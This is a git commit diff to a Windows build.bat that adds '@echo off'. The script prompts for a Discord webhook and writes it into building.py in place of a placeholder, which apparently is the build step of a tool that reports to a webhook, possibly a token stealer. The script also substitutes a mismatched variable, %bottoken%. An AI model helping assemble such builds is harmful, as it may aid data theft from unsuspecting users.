713923218e846c82cbb988fd362a27539fd47393
43a1723 <hai1723notgay@gmail.com>
2024-08-03 17:41:09 +0700

    Update build.bat

--- build.bat
+++ build.bat
@@ -1,3 +1,4 @@
+@echo off
 echo hai1723 very suck ben
 set /p webhook="Enter Webhook Discord: "
 powershell -Command "(Get-Content building.py) -replace 'REPLACE_YOUR_WEBHOOK', '%bottoken%' | Set-Content building.py"
